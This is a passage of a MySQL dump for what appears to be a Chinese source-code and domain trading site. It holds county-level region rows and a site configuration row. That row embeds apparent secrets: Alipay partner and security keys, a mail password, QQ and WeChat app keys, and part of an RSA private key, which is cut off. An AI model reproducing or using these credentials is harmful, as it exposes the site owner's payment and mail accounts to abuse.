(3264, '1610408', '礼泉县', 3, '1302', 0),
(3265, '1610409', '永寿县', 3, '1302', 0),
(3266, '1610410', '彬县', 3, '1302', 0),
(3267, '1610411', '长武县', 3, '1302', 0),
(3268, '1610412', '旬邑县', 3, '1302', 0),
(3269, '1610413', '淳化县', 3, '1302', 0),
(3270, '1610414', '武功县', 3, '1302', 0),
(3271, '1610499', '其他区县', 3, '1302', 0),
(3272, '1610501', '临渭区', 3, '1305', 0),
(3273, '1610502', '华阴市', 3, '1305', 0),
(3274, '1610503', '韩城市', 3, '1305', 0),
(3275, '1310', '华县', 3, '1305', 0),
(3276, '1610505', '潼关县', 3, '1305', 0),
(3277, '1610506', '大荔县', 3, '1305', 0),
(3278, '1610507', '蒲城县', 3, '1305', 0),
(3279, '1610508', '澄城县', 3, '1305', 0),
(3280, '1610509', '白水县', 3, '1305', 0),
(3281, '1610510', '合阳县', 3, '1305', 0),
(3282, '1610511', '富平县', 3, '1305', 0),
(3283, '1610599', '其他区县', 3, '1305', 0),
(3284, '1610601', '宝塔区', 3, '1306', 0),
(3285, '1610602', '延长县', 3, '1306', 0),
(3286, '1610603', '延川县', 3, '1306', 0),
(3287, '1610604', '子长县', 3, '1306', 0),
(3288, '1610605', '安塞县', 3, '1306', 0),
(3289, '1610606', '志丹县', 3, '1306', 0),
(3290, '1610607', '吴起县', 3, '1306', 0),
(3291, '1610608', '甘泉县', 3, '1306', 0),
(3292, '1610609', '富县', 3, '1306', 0),
(3293, '1610610', '洛川县', 3, '1306', 0),
(3294, '1610611', '宜川县', 3, '1306', 0),
(3295, '1610612', '黄龙县', 3, '1306', 0),
(3296, '1610613', '黄陵县', 3, '1306', 0),
(3297, '1610699', '其他区县', 3, '1306', 0),
(3298, '1610701', '汉台区', 3, '1308', 0),
(3299, '1610702', '南郑县', 3, '1308', 0),
(3300, '1610703', '城固县', 3, '1308', 0),
(3301, '1610704', '洋县', 3, '1308', 0),
(3302, '1610705', '西乡县', 3, '1308', 0),
(3303, '1610706', '勉县', 3, '1308', 0),
(3304, '1610707', '宁强县', 3, '1308', 0),
(3305, '1610708', '略阳县', 3, '1308', 0),
(3306, '1610709', '镇巴县', 3, '1308', 0),
(3307, '1610710', '留坝县', 3, '1308', 0),
(3308, '1610711', '佛坪县', 3, '1308', 0),
(3309, '1610799', '其他区县', 3, '1308', 0),
(3310, '1610801', '榆阳区', 3, '1303', 0),
(3311, '1610802', '神木县', 3, '1303', 0),
(3312, '1610803', '府谷县', 3, '1303', 0),
(3313, '1610804', '横山县', 3, '1303', 0),
(3314, '1610805', '靖边县', 3, '1303', 0),
(3315, '1610806', '定边县', 3, '1303', 0),
(3316, '1610807', '绥德县', 3, '1303', 0),
(3317, '1610808', '米脂县', 3, '1303', 0),
(3318, '1610809', '佳县', 3, '1303', 0),
(3319, '1610810', '吴堡县', 3, '1303', 0),
(3320, '1610811', '清涧县', 3, '1303', 0),
(3321, '1610812', '子洲县', 3, '1303', 0),
(3322, '1610899', '其他区县', 3, '1303', 0),
(3323, '1610901', '汉滨区', 3, '1304', 0),
(3324, '1610902', '汉阴县', 3, '1304', 0),
(3325, '1610903', '石泉县', 3, '1304', 0),
(3326, '1610904', '宁陕县', 3, '1304', 0),
(3327, '1610905', '紫阳县', 3, '1304', 0),
(3328, '1610906', '岚皋县', 3, '1304', 0),
(3329, '1610907', '平利县', 3, '1304', 0),
(3330, '1610908', '镇坪县', 3, '1304', 0),
(3331, '1610909', '旬阳县', 3, '1304', 0),
(3332, '1610910', '白河县', 3, '1304', 0),
(3333, '1610999', '其他区县', 3, '1304', 0),
(3334, '1611001', '商州区', 3, '16110', 0),
(3335, '1611002', '洛南县', 3, '16110', 0),
(3336, '1611003', '丹凤县', 3, '16110', 0),
(3337, '1611004', '商南县', 3, '16110', 0),
(3338, '1611005', '山阳县', 3, '16110', 0),
(3339, '1611006', '镇安县', 3, '16110', 0),
(3340, '1611007', '柞水县', 3, '16110', 0),
(3341, '1611099', '其他区县', 3, '16110', 0),
(3342, '1620101', '城关区', 3, '2701', 0),
(3343, '1620102', '七里河区', 3, '2701', 0),
(3344, '1620103', '西固区', 3, '2701', 0),
(3345, '1620104', '安宁区', 3, '2701', 0),
(3346, '1620105', '红古区', 3, '2701', 0),
(3347, '1620106', '永登县', 3, '2701', 0),
(3348, '1620107', '皋兰县', 3, '2701', 0),
(3349, '1620108', '榆中县', 3, '2701', 0),
(3350, '1620199', '其他区县', 3, '2701', 0),
(3351, '1620301', '金川区', 3, '2703', 0),
(3352, '1620302', '永昌县', 3, '2703', 0),
(3353, '1620399', '其他区县', 3, '2703', 0),
(3354, '1620401', '白银区', 3, '16204', 0),
(3355, '1620402', '平川区', 3, '16204', 0),
(3356, '1620403', '靖远县', 3, '16204', 0),
(3357, '1620404', '会宁县', 3, '16204', 0),
(3358, '1620405', '景泰县', 3, '16204', 0),
(3359, '1620499', '其他区县', 3, '16204', 0),
(3360, '1620501', '秦州区', 3, '2704', 0),
(3361, '1620502', '麦积区', 3, '2704', 0),
(3362, '1620503', '清水县', 3, '2704', 0),
(3363, '1620504', '秦安县', 3, '2704', 0),
(3364, '1620505', '甘谷县', 3, '2704', 0),
(3365, '1620506', '武山县', 3, '2704', 0),
(3366, '1620507', '张家川回族自治县', 3, '2704', 0),
(3367, '1620599', '其他区县', 3, '2704', 0),
(3368, '1620601', '凉州区', 3, '16206', 0),
(3369, '1620602', '民勤县', 3, '16206', 0),
(3370, '1620603', '古浪县', 3, '16206', 0),
(3371, '1620604', '天祝藏族自治县', 3, '16206', 0),
(3372, '1620699', '其他区县', 3, '16206', 0),
(3373, '1620701', '甘州区', 3, '16207', 0),
(3374, '1620702', '民乐县', 3, '16207', 0),
(3375, '1620703', '临泽县', 3, '16207', 0),
(3376, '1620704', '高台县', 3, '16207', 0),
(3377, '1620705', '山丹县', 3, '16207', 0),
(3378, '1620706', '肃南裕固族自治县', 3, '16207', 0),
(3379, '1620799', '其他区县', 3, '16207', 0),
(3380, '1620801', '崆峒区', 3, '16208', 0),
(3381, '1620802', '泾川县', 3, '16208', 0),
(3382, '1620803', '灵台县', 3, '16208', 0),
(3383, '1620804', '崇信县', 3, '16208', 0),
(3384, '1620805', '华亭县', 3, '16208', 0),
(3385, '1620806', '庄浪县', 3, '16208', 0),
(3386, '1620807', '静宁县', 3, '16208', 0),
(3387, '1620899', '其他区县', 3, '16208', 0),
(3388, '1620901', '肃州区', 3, '2706', 0),
(3389, '1620902', '玉门市', 3, '2706', 0),
(3390, '1620903', '敦煌市', 3, '2706', 0),
(3391, '1620904', '金塔县', 3, '2706', 0),
(3392, '1620905', '瓜州县', 3, '2706', 0),
(3393, '1620906', '肃北蒙古族自治县', 3, '2706', 0),
(3394, '1620907', '阿克塞哈萨克族自治县', 3, '2706', 0),
(3395, '1620999', '其他区县', 3, '2706', 0),
(3396, '1621001', '西峰区', 3, '16210', 0),
(3397, '1621002', '庆城县', 3, '16210', 0),
(3398, '1621003', '环县', 3, '16210', 0),
(3399, '1621004', '华池县', 3, '16210', 0),
(3400, '1621005', '合水县', 3, '16210', 0),
(3401, '1621006', '正宁县', 3, '16210', 0),
(3402, '1621007', '宁县', 3, '16210', 0),
(3403, '1621008', '镇原县', 3, '16210', 0),
(3404, '1621099', '其他区县', 3, '16210', 0),
(3405, '1621101', '安定区', 3, '16211', 0),
(3406, '1621102', '通渭县', 3, '16211', 0),
(3407, '1621103', '临洮县', 3, '16211', 0),
(3408, '1621104', '漳县', 3, '16211', 0),
(3409, '1621105', '岷县', 3, '16211', 0),
(3410, '1621106', '渭源县', 3, '16211', 0),
(3411, '1621107', '陇西县', 3, '16211', 0),
(3412, '1621199', '其他区县', 3, '16211', 0);
INSERT INTO `yjcode_city` (`id`, `bh`, `name1`, `level`, `parentid`, `xh`) VALUES
(3413, '1621201', '武都区', 3, '16212', 0),
(3414, '1621202', '成县', 3, '16212', 0),
(3415, '1621203', '宕昌县', 3, '16212', 0),
(3416, '1621204', '康县', 3, '16212', 0),
(3417, '1621205', '文县', 3, '16212', 0),
(3418, '1621206', '西和县', 3, '16212', 0),
(3419, '1621207', '礼县', 3, '16212', 0),
(3420, '1621208', '两当县', 3, '16212', 0),
(3421, '1621209', '徽县', 3, '16212', 0),
(3422, '1621299', '其他区县', 3, '16212', 0),
(3423, '1621301', '临夏市', 3, '16213', 0),
(3424, '1621302', '临夏县', 3, '16213', 0),
(3425, '1621303', '康乐县', 3, '16213', 0),
(3426, '1621304', '永靖县', 3, '16213', 0),
(3427, '1621305', '广河县', 3, '16213', 0),
(3428, '1621306', '和政县', 3, '16213', 0),
(3429, '1621307', '东乡族自治县', 3, '16213', 0),
(3430, '1621308', '积石山保安族东乡族撒拉族自治县', 3, '16213', 0),
(3431, '1621399', '其他区县', 3, '16213', 0),
(3432, '1621401', '合作市', 3, '16214', 0),
(3433, '1621402', '临潭县', 3, '16214', 0),
(3434, '1621403', '卓尼县', 3, '16214', 0),
(3435, '1621404', '舟曲县', 3, '16214', 0),
(3436, '1621405', '迭部县', 3, '16214', 0),
(3437, '1621406', '玛曲县', 3, '16214', 0),
(3438, '1621407', '碌曲县', 3, '16214', 0),
(3439, '1621408', '夏河县', 3, '16214', 0),
(3440, '1621499', '其他区县', 3, '16214', 0),
(3441, '1630101', '城中区', 3, '3101', 0),
(3442, '1630102', '城东区', 3, '3101', 0),
(3443, '1630103', '城西区', 3, '3101', 0),
(3444, '1630104', '城北区', 3, '3101', 0),
(3445, '1630105', '湟源县', 3, '3101', 0),
(3446, '1630106', '湟中县', 3, '3101', 0),
(3447, '1630107', '大通回族土族自治县', 3, '3101', 0),
(3448, '1630199', '其他区县', 3, '3101', 0),
(3449, '1630201', '平安县', 3, '3102', 0),
(3450, '1630202', '乐都县', 3, '3102', 0),
(3451, '1630203', '民和回族土族自治县', 3, '3102', 0),
(3452, '1630204', '互助土族自治县', 3, '3102', 0),
(3453, '1630205', '化隆回族自治县', 3, '3102', 0),
(3454, '1630206', '循化撒拉族自治县', 3, '3102', 0),
(3455, '1630299', '其他区县', 3, '3102', 0),
(3456, '1630301', '海晏县', 3, '3103', 0),
(3457, '1630302', '祁连县', 3, '3103', 0),
(3458, '1630303', '刚察县', 3, '3103', 0),
(3459, '1630304', '门源回族自治县', 3, '3103', 0),
(3460, '1630399', '其他区县', 3, '3103', 0),
(3461, '1630401', '同仁县', 3, '3105', 0),
(3462, '1630402', '尖扎县', 3, '3105', 0),
(3463, '1630403', '泽库县', 3, '3105', 0),
(3464, '1630404', '河南蒙古族自治县', 3, '3105', 0),
(3465, '1630499', '其他区县', 3, '3105', 0),
(3466, '1630501', '共和县', 3, '3104', 0),
(3467, '1630502', '同德县', 3, '3104', 0),
(3468, '1630503', '贵德县', 3, '3104', 0),
(3469, '1630504', '兴海县', 3, '3104', 0),
(3470, '1630505', '贵南县', 3, '3104', 0),
(3471, '1630599', '其他区县', 3, '3104', 0),
(3472, '1630601', '玛沁县', 3, '16306', 0),
(3473, '1630602', '班玛县', 3, '16306', 0),
(3474, '1630603', '甘德县', 3, '16306', 0),
(3475, '1630604', '达日县', 3, '16306', 0),
(3476, '1630605', '久治县', 3, '16306', 0),
(3477, '1630606', '玛多县', 3, '16306', 0),
(3478, '1630699', '其他区县', 3, '16306', 0),
(3479, '1630701', '玉树县', 3, '16307', 0),
(3480, '1630702', '杂多县', 3, '16307', 0),
(3481, '1630703', '称多县', 3, '16307', 0),
(3482, '1630704', '治多县', 3, '16307', 0),
(3483, '1630705', '囊谦县', 3, '16307', 0),
(3484, '1630706', '曲麻莱县', 3, '16307', 0),
(3485, '1630799', '其他区县', 3, '16307', 0),
(3486, '1630801', '德令哈市', 3, '16308', 0),
(3487, '1630802', '格尔木市', 3, '16308', 0),
(3488, '1630803', '乌兰县', 3, '16308', 0),
(3489, '1630804', '都兰县', 3, '16308', 0),
(3490, '1630805', '天峻县', 3, '16308', 0),
(3491, '1630806', '冷湖行委', 3, '16308', 0),
(3492, '1630807', '大柴旦行委', 3, '16308', 0),
(3493, '1630808', '茫崖行委', 3, '16308', 0),
(3494, '1630899', '其他区县', 3, '16308', 0),
(3495, '1640101', '兴庆区', 3, '2801', 0),
(3496, '1640102', '金凤区', 3, '2801', 0),
(3497, '1640103', '西夏区', 3, '2801', 0),
(3498, '1640104', '灵武市', 3, '2801', 0),
(3499, '1640105', '永宁县', 3, '2801', 0),
(3500, '1640106', '贺兰县', 3, '2801', 0),
(3501, '1640199', '其他区县', 3, '2801', 0),
(3502, '1640201', '大武口区', 3, '2802', 0),
(3503, '1640202', '惠农区', 3, '2802', 0),
(3504, '1640203', '平罗县', 3, '2802', 0),
(3505, '1640299', '其他区县', 3, '2802', 0),
(3506, '1640301', '利通区', 3, '2803', 0),
(3507, '1640302', '青铜峡市', 3, '2803', 0),
(3508, '1640303', '盐池县', 3, '2803', 0),
(3509, '1640304', '同心县', 3, '2803', 0),
(3510, '1640399', '其他区县', 3, '2803', 0),
(3511, '1640401', '原州区', 3, '2804', 0),
(3512, '1640402', '西吉县', 3, '2804', 0),
(3513, '1640403', '隆德县', 3, '2804', 0),
(3514, '1640404', '泾源县', 3, '2804', 0),
(3515, '1640405', '彭阳县', 3, '2804', 0),
(3516, '1640499', '其他区县', 3, '2804', 0),
(3517, '1640501', '沙坡头区', 3, '16405', 0),
(3518, '1640502', '中宁县', 3, '16405', 0),
(3519, '1640503', '海原县', 3, '16405', 0),
(3520, '1640599', '其他区县', 3, '16405', 0),
(3521, '1650101', '天山区', 3, '2601', 0),
(3522, '1650102', '沙依巴克区', 3, '2601', 0),
(3523, '1650103', '新市区', 3, '2601', 0),
(3524, '1650104', '水磨沟区', 3, '2601', 0),
(3525, '1650105', '头屯河区', 3, '2601', 0),
(3526, '1650106', '达坂城区', 3, '2601', 0),
(3527, '1650107', '米东区', 3, '2601', 0),
(3528, '1650108', '乌鲁木齐县', 3, '2601', 0),
(3529, '1650199', '其他区县', 3, '2601', 0),
(3530, '1650201', '克拉玛依区', 3, '2613', 0),
(3531, '1650202', '独山子区', 3, '2613', 0),
(3532, '1650203', '白碱滩区', 3, '2613', 0),
(3533, '1650204', '乌尔禾区', 3, '2613', 0),
(3534, '1650299', '其他区县', 3, '2613', 0),
(3535, '2614', '吐鲁番市', 3, '16503', 0),
(3536, '1650302', '鄯善县', 3, '16503', 0),
(3537, '1650303', '托克逊县', 3, '16503', 0),
(3538, '1650399', '其他区县', 3, '16503', 0),
(3539, '2609', '哈密市', 3, '16504', 0),
(3540, '1650402', '伊吾县', 3, '16504', 0),
(3541, '1650403', '巴里坤哈萨克自治县', 3, '16504', 0),
(3542, '1650499', '其他区县', 3, '16504', 0),
(3543, '2608', '和田市', 3, '2604', 0),
(3544, '1650502', '和田县', 3, '2604', 0),
(3545, '1650503', '墨玉县', 3, '2604', 0),
(3546, '1650504', '皮山县', 3, '2604', 0),
(3547, '1650505', '洛浦县', 3, '2604', 0),
(3548, '1650506', '策勒县', 3, '2604', 0),
(3549, '1650507', '于田县', 3, '2604', 0),
(3550, '1650508', '民丰县', 3, '2604', 0),
(3551, '1650599', '其他区县', 3, '2604', 0),
(3552, '2607', '阿克苏市', 3, '2603', 0),
(3553, '1650602', '温宿县', 3, '2603', 0),
(3554, '1650603', '库车县', 3, '2603', 0),
(3555, '1650604', '沙雅县', 3, '2603', 0),
(3556, '1650605', '新和县', 3, '2603', 0),
(3557, '1650606', '拜城县', 3, '2603', 0),
(3558, '1650607', '乌什县', 3, '2603', 0),
(3559, '1650608', '阿瓦提县', 3, '2603', 0),
(3560, '1650609', '柯坪县', 3, '2603', 0),
(3561, '1650699', '其他区县', 3, '2603', 0),
(3562, '2611', '喀什市', 3, '2602', 0),
(3563, '1650702', '疏附县', 3, '2602', 0),
(3564, '1650703', '疏勒县', 3, '2602', 0),
(3565, '1650704', '英吉沙县', 3, '2602', 0),
(3566, '1650705', '泽普县', 3, '2602', 0),
(3567, '1650706', '莎车县', 3, '2602', 0),
(3568, '1650707', '叶城县', 3, '2602', 0),
(3569, '1650708', '麦盖提县', 3, '2602', 0),
(3570, '1650709', '岳普湖县', 3, '2602', 0),
(3571, '1650710', '伽师县', 3, '2602', 0),
(3572, '1650711', '巴楚县', 3, '2602', 0),
(3573, '1650712', '塔什库尔干塔吉克自治县', 3, '2602', 0),
(3574, '1650799', '其他区县', 3, '2602', 0),
(3575, '1650801', '阿图什市', 3, '16508', 0),
(3576, '1650802', '阿克陶县', 3, '16508', 0),
(3577, '1650803', '阿合奇县', 3, '16508', 0),
(3578, '1650804', '乌恰县', 3, '16508', 0),
(3579, '1650899', '其他区县', 3, '16508', 0),
(3580, '2606', '库尔勒市', 3, '16509', 0),
(3581, '1650902', '轮台县', 3, '16509', 0),
(3582, '1650903', '尉犁县', 3, '16509', 0),
(3583, '1650904', '若羌县', 3, '16509', 0),
(3584, '1650905', '且末县', 3, '16509', 0),
(3585, '1650906', '和静县', 3, '16509', 0),
(3586, '1650907', '和硕县', 3, '16509', 0),
(3587, '1650908', '博湖县', 3, '16509', 0),
(3588, '1650909', '焉耆回族自治县', 3, '16509', 0),
(3589, '1650999', '其他区县', 3, '16509', 0),
(3590, '2610', '昌吉市', 3, '2605', 0),
(3591, '1651002', '阜康市', 3, '2605', 0),
(3592, '1651003', '呼图壁县', 3, '2605', 0),
(3593, '1651004', '玛纳斯县', 3, '2605', 0),
(3594, '1651005', '奇台县', 3, '2605', 0),
(3595, '1651006', '吉木萨尔县', 3, '2605', 0),
(3596, '1651007', '木垒哈萨克自治县', 3, '2605', 0),
(3597, '1651099', '其他区县', 3, '2605', 0),
(3598, '2618', '博乐市', 3, '16511', 0),
(3599, '1651102', '精河县', 3, '16511', 0),
(3600, '1651103', '温泉县', 3, '16511', 0),
(3601, '1651199', '其他区县', 3, '16511', 0),
(3602, '2619', '伊宁市', 3, '16512', 0),
(3603, '2615', '奎屯市', 3, '16512', 0),
(3604, '1651203', '伊宁县', 3, '16512', 0),
(3605, '1651204', '霍城县', 3, '16512', 0),
(3606, '1651205', '巩留县', 3, '16512', 0),
(3607, '1651206', '新源县', 3, '16512', 0),
(3608, '1651207', '昭苏县', 3, '16512', 0),
(3609, '1651208', '特克斯县', 3, '16512', 0),
(3610, '1651209', '尼勒克县', 3, '16512', 0),
(3611, '1651210', '察布查尔锡伯自治县', 3, '16512', 0),
(3612, '1651299', '其他区县', 3, '16512', 0),
(3613, '2620', '塔城市', 3, '16513', 0),
(3614, '1651302', '乌苏市', 3, '16513', 0),
(3615, '1651303', '额敏县', 3, '16513', 0),
(3616, '1651304', '沙湾县', 3, '16513', 0),
(3617, '1651305', '托里县', 3, '16513', 0),
(3618, '1651306', '裕民县', 3, '16513', 0),
(3619, '1651307', '和布克赛尔蒙古自治县', 3, '16513', 0),
(3620, '1651399', '其他区县', 3, '16513', 0),
(3621, '2617', '阿勒泰市', 3, '16514', 0),
(3622, '1651402', '布尔津县', 3, '16514', 0),
(3623, '1651403', '富蕴县', 3, '16514', 0),
(3624, '1651404', '福海县', 3, '16514', 0),
(3625, '1651405', '哈巴河县', 3, '16514', 0),
(3626, '1651406', '青河县', 3, '16514', 0),
(3627, '1651407', '吉木乃县', 3, '16514', 0),
(3628, '1651499', '其他区县', 3, '16514', 0);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_clear`
--

CREATE TABLE IF NOT EXISTS `yjcode_clear` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `tp` char(50) DEFAULT NULL,
  `type1` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=17 ;

--
-- 转存表中的数据 `yjcode_clear`
--

INSERT INTO `yjcode_clear` (`id`, `bh`, `tp`, `type1`, `sj`) VALUES
(7, '1490602902n67', 'upload/news/20170327/1490602902n67/1490602931.jpg', '资讯', '2017-03-27 16:22:11'),
(8, '1490604766n56', 'upload/news/20170327/1490604766n56/1515340922.jpg', '', '2018-01-08 00:02:02'),
(9, '1490604766n56', 'upload/news/20170327/1490604766n56/1515340932.jpg', '', '2018-01-08 00:02:12'),
(14, '1490603043n45', 'upload/news/20170327/1490603043n45/1515340981.jpg', '', '2018-01-08 00:03:01');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_control`
--

CREATE TABLE IF NOT EXISTS `yjcode_control` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `weburlv` char(50) DEFAULT NULL,
  `webnamev` char(50) DEFAULT NULL,
  `webtit` varchar(250) DEFAULT NULL,
  `webkey` varchar(250) DEFAULT NULL,
  `webdes` text,
  `webtj` text,
  `dbsj` int(11) DEFAULT NULL,
  `ycsj` int(11) DEFAULT NULL,
  `tksj` int(11) DEFAULT NULL,
  `webtelv` char(50) DEFAULT NULL,
  `webqqv` varchar(250) DEFAULT NULL,
  `selltc` float DEFAULT NULL,
  `regmoney` float DEFAULT NULL,
  `pjjf` int(11) DEFAULT NULL,
  `zftype` int(11) DEFAULT NULL,
  `partner` char(50) DEFAULT NULL,
  `security_code` char(50) DEFAULT NULL,
  `seller_email` char(50) DEFAULT NULL,
  `ifsell` char(10) DEFAULT NULL,
  `openshop` float DEFAULT NULL,
  `ifproduct` char(10) DEFAULT NULL,
  `mailname` char(50) DEFAULT NULL,
  `mailsmtp` char(50) DEFAULT NULL,
  `mailpwd` char(50) DEFAULT NULL,
  `maildk` char(10) DEFAULT NULL,
  `qqappid` char(50) DEFAULT NULL,
  `qqappkey` varchar(200) DEFAULT NULL,
  `ifmob` char(10) DEFAULT NULL,
  `smsfun` text,
  `ifkf` char(10) DEFAULT NULL,
  `beian` char(50) DEFAULT NULL,
  `websyposv` int(11) DEFAULT NULL,
  `qdjf` int(10) DEFAULT NULL,
  `regjf` int(10) DEFAULT NULL,
  `jfmoney` int(10) DEFAULT NULL,
  `tjmoney` float DEFAULT NULL,
  `bankbh` char(50) DEFAULT NULL,
  `bankkey` char(50) DEFAULT NULL,
  `taskok` int(11) DEFAULT NULL,
  `sellbl` float DEFAULT NULL,
  `smskc` int(10) DEFAULT NULL,
  `sermode` int(10) DEFAULT NULL,
  `txdi` int(10) DEFAULT '0',
  `txfl` float DEFAULT '0',
  `nowmb` char(50) DEFAULT NULL,
  `shoprz` char(50) DEFAULT NULL,
  `inittj` varchar(200) DEFAULT NULL,
  `fhxs` char(40) DEFAULT NULL,
  `wxpay` text,
  `yunpay` varchar(250) DEFAULT NULL,
  `ifuc` int(10) DEFAULT NULL,
  `ifci` int(10) DEFAULT NULL,
  `ci` text,
  `txyh` varchar(220) DEFAULT '支付宝',
  `wxpayfs` int(10) DEFAULT NULL,
  `smsmode` int(10) DEFAULT NULL,
  `taskyj` float DEFAULT NULL,
  `ifwap` int(10) DEFAULT NULL,
  `iftask` int(10) DEFAULT NULL,
  `otherpay` text,
  `taskoksj` int(10) DEFAULT NULL,
  `taskerrsj` int(10) DEFAULT NULL,
  `openbao` float DEFAULT NULL,
  `wxlogin` varchar(250) DEFAULT NULL,
  `regmob` int(10) DEFAULT NULL,
  `sxjf` int(10) DEFAULT '10',
  `paysxf` float DEFAULT NULL,
  `ifarea` int(10) DEFAULT NULL,
  `taskjs` varchar(200) DEFAULT NULL,
  `alioss` text,
  `wapmb` char(50) DEFAULT NULL,
  `picys` int(10) DEFAULT NULL,
  `ifshell` int(10) DEFAULT NULL,
  `mailstr` varchar(250) DEFAULT NULL,
  `fenxiang` int(10) DEFAULT NULL,
  `addir` char(50) DEFAULT NULL,
  `qzmot` int(10) DEFAULT NULL,
  `ipzcnum` int(10) DEFAULT NULL,
  `ipnewsnum` int(10) DEFAULT NULL,
  `ifopenshop` char(10) DEFAULT 'on',
  `alipaywap` text,
  `mrbuy` int(10) DEFAULT NULL,
  `aliosskg` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `yjcode_control`
--

INSERT INTO `yjcode_control` (`id`, `weburlv`, `webnamev`, `webtit`, `webkey`, `webdes`, `webtj`, `dbsj`, `ycsj`, `tksj`, `webtelv`, `webqqv`, `selltc`, `regmoney`, `pjjf`, `zftype`, `partner`, `security_code`, `seller_email`, `ifsell`, `openshop`, `ifproduct`, `mailname`, `mailsmtp`, `mailpwd`, `maildk`, `qqappid`, `qqappkey`, `ifmob`, `smsfun`, `ifkf`, `beian`, `websyposv`, `qdjf`, `regjf`, `jfmoney`, `tjmoney`, `bankbh`, `bankkey`, `taskok`, `sellbl`, `smskc`, `sermode`, `txdi`, `txfl`, `nowmb`, `shoprz`, `inittj`, `fhxs`, `wxpay`, `yunpay`, `ifuc`, `ifci`, `ci`, `txyh`, `wxpayfs`, `smsmode`, `taskyj`, `ifwap`, `iftask`, `otherpay`, `taskoksj`, `taskerrsj`, `openbao`, `wxlogin`, `regmob`, `sxjf`, `paysxf`, `ifarea`, `taskjs`, `alioss`, `wapmb`, `picys`, `ifshell`, `mailstr`, `fenxiang`, `addir`, `qzmot`, `ipzcnum`, `ipnewsnum`, `ifopenshop`, `alipaywap`, `mrbuy`, `aliosskg`) VALUES
(1, 'http://localhost/', '商城源码', '商城源码交易源码交易域名交易服务中心', '商城源码站长交易,源码交易,程序交易,域名交易,链接买卖,任务交易,网站交易,广告买卖,站长培训,建站美工任务', '站长交易服务中心；网站交易、源码交易、域名交易、链接交易、广告买卖、建站美工任务；安全快捷的站长交易、出售、求购、交流分享平台', '', 3, 7, 1, '15588000000', '123456789*购买源码,123456789*客服', 0.7, 1, 10, 0, '2088702797847216', 'bviqfw4d2tnbq5d1t4g4kzd535fdjf3e', '18673809841', 'on', 10, 'on', 'yun@928aas.com', 'smtp.mxhichina.com', '56445457485', '25', '101357647', 'fc5255d713dd6103bb524f71219da563', 'on', '', 'off', '', 5, 10, 10, 10, 0.02, '', '', 1, 0.8, -32, 0, 100, 0.02, 'gao', 'xcf1xcf2xcf', '', '1,2,3,4,5,', 'wx1557770934ff4ea9,1491218622,c227390f9a64f9b4ca73c0c6230ec91d,4f75d3186f2b48bb0fda67572e0fbcf9', ',,', 0, 0, '', '支付宝xcf微信xcf工商银行xcf农业银行xcf建设银行xcf中国银行xcf', 0, 0, 0, 0, 0, '218261,pAkkOE85wiTAabSGT5WLvjfLttXBUTbC', 15, 15, 0, 'wxb0c14f102e8724fd,397c02a5e8f5644e22a0902b10a33715', 0, 10, 0.01, 0, 'xcf1xcf2xcf4xcf', NULL, 'zhan', 0, 0, 'yun@928aas.com,,smtp.mxhichina.com,25', 0, 'gg', 0, 20, 20, 'on', '2017122701265824,MIIEogIBAAKCAQEA030gu9Kxi/W1D2TP1h0ZzM1KbiYzQDBwbj8kaclMcdJbS76rBlgxSnmBeB+jsP0bTROov7PkJbTAvDrJJKNffV45yuvdNivInWMgn1bAVoRmYueutw9t9kXwecijFn2kphiLDDQrP97h303r625wZvernxsbEnVyzUDCZVozGmyTd6Jqv0vuj1DU/SvG1CvNA8xO6wxdJFx1nDRjlI2Cp7vbPPv+9lfA8ImIpi0cjmdl42BI/HVyxlTC0NRO3iQZxFiAbntMWfKl/tygpXKV8p0Fj74TtEK+W+WnJkCFayZfr8TSc/7g6omByGYI5/ITca62Abe4ur9YufWsQ1R6HQIDAQABAoIBABnHAppiD+nzROJfc0WxvldMHmpWlaCZRtrpL1MFih/FeAM/djELxtZBARrXIGiOMSmv372d+4zs/yDyOVoR3620Mm8dWJUluQoV7v/83uysrp4XhyAg7VI7LBhr8BTps4vbKfeO1Eawr+873CmSCHlEbtKxxxb04c1Ku2cHG3t4z6oN7spNBtp6MoqJOrwNKGfrJCvp4n6Plhlkf2n250HewUGPiibia0Q1eVO7ydGVyormoDXThwJp852xdR+pqd4pnTbk9aaMwxUWqdY6Aw3G0C/9ip39KPq140D9ykb9J15tmvkkl2Xk48PVQgQIn3F0H3UkwvtqwhU6ewe2NwECgYEA8waQhacwrV4xUD3V+gB5AlZQ6ZR1CjXoCSu2IPL6JCXaoB/aRtVv+R5rNgW/HtXvIAVPl4KjG+dX1ORgzAHhHRe0wmvw4y6gAscsrW+cE+3YNrBXWDTzBevgHNMR3SpOTclNSNEV7rrpa5MhxMHrnZk966JJxIbbgqHggFkVkU0CgYEA3seMa26kYic3+HtFvD/EmIUdrzURKFt6z+KhGkzEK9i6zR1c0zpE6EwiP1vwcOvjLmLVwNgt+FTEEz0tjlye+uKgC2v5JsgGT5OsZSUMsTM+JKvw1xLeLNcf4o6hSNpvxibqnAIK5lAMe/g23/0s704ikGOnH6d2slQv08bTJBECgYBkJtBoQ/5LdAXei50i6g70Z53wpL2W96AoJ1tnOLrdKrxuQLIzfsImZ+LG4Jdincdt6sJiLfQKC8ymb3d0m1GqK5rShKlA9nX6rxo6X0Ry8hGoeAOG1ktQpWQ2fMVf349lfw/aclAXke+f5YKFE2WGDSD3emnsE6dirlNWkV/SAQKBgD/HDPIsqK7Y33Mph1tPPi8T3N2t6Y2OMuiUzt5Cn96Vm1ThVRO7mMKQGTXeUkVhopZDAULGINL5IXEIkKQy6+iTPJJIhPmPRg8+DZqfMrUAIIhLGRXZdvWLWLt5bb73mgw2U+/5vbkVrZ1IAB2700NnMQn5HX04agi/hTmxr/yhAoGALRoCRYcLoF4F0s4J7elursVu9RQaj3yCMaZ+kHIKcYUrLIIX378GTfZzCaFd9988xF0RQqVhQ8OdEWzV3Uoq5A/nMfBWdvsH8qqeP3nGuXQN+WoAZZmjusbZ+9hJKl9WFPENjYC4poBQhHVvdtWXvmPudgXA943hZ6iCWAboWWg=,MII